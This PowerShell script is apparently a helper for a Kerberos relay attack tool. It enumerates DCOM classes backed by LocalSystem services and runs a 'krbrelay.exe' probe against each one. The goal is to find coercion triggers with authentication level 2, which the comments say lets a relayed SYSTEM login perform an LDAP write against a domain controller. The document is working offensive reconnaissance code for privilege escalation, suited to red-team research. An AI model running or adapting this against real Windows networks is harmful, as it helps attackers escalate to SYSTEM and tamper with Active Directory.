# Survey DCOM triggers for a level-2 (no-integrity) coerced context.
#
# Enumerates every DCOM AppID backed by a LocalSystem service, finds the CLSIDs
# that map to it, then runs the probe exe once per CLSID with KRBRELAY_PROBE set
# (no relay needed) and reports the coerced auth level.
#
# auth_level=2 (CONNECT, no integrity) is the one that makes the direct-kerberos
# post-bind write work. auth_level=5/6 (packet integrity/privacy) blocks it.
#
# Run in an operator session (the coercion does not fire in a session-0 WinRM
# shell). Point -Exe at the built probe exe from branch exp/direct-kerberos.
#
#   .\survey_triggers.ps1 -Exe .\krbrelay.exe
#
param(
    [string]$Exe = ".\krbrelay.exe",
    [string]$Spn = "ldap/dc.mayyhem.com"
)

$env:KRBRELAY_PROBE = "1"

# AppID -> LocalService, for AppIDs that name a service.
$appidToSvc = @{}
Get-ChildItem 'HKLM:\SOFTWARE\Classes\AppID' -ErrorAction SilentlyContinue | ForEach-Object {
    $ls = (Get-ItemProperty $_.PSPath -Name 'LocalService' -ErrorAction SilentlyContinue).LocalService
    if ($ls) { $appidToSvc[$_.PSChildName.ToUpper()] = $ls }
}

# Services that run as LocalSystem, with their start mode.
$svcInfo = @{}
Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.StartName -eq 'LocalSystem') { $svcInfo[$_.Name.ToLower()] = $_.StartMode }
}

# CLSIDs whose AppID maps to a LocalSystem service.
$candidates = @()
Get-ChildItem 'HKLM:\SOFTWARE\Classes\CLSID' -ErrorAction SilentlyContinue | ForEach-Object {
    $appid = (Get-ItemProperty $_.PSPath -Name 'AppID' -ErrorAction SilentlyContinue).AppID
    if ($appid -and $appidToSvc.ContainsKey($appid.ToUpper())) {
        $svc = $appidToSvc[$appid.ToUpper()]
        if ($svcInfo.ContainsKey($svc.ToLower())) {
            $name = (Get-ItemProperty $_.PSPath -Name '(default)' -ErrorAction SilentlyContinue).'(default)'
            $candidates += [pscustomobject]@{
                CLSID = $_.PSChildName; Service = $svc
                Start = $svcInfo[$svc.ToLower()]; Name = $name
            }
        }
    }
}

Write-Host ("[*] {0} LocalSystem-backed DCOM CLSIDs found" -f $candidates.Count)
foreach ($c in ($candidates | Sort-Object Service)) {
    $out = & $Exe 127.0.0.1 9999 $Spn 127.0.0.1 7989 $c.CLSID 2>&1 | Out-String
    $probe = (($out -split "`r?`n") | Where-Object { $_ -match '\[probe\]' }) -join ' '
    if (-not $probe) {
        $probe = (($out -split "`r?`n") | Where-Object { $_ -match 'stage' }) -join ' '
    }
    "{0}  svc={1} start={2}  => {3}" -f $c.CLSID, $c.Service, $c.Start, $probe.Trim()
}
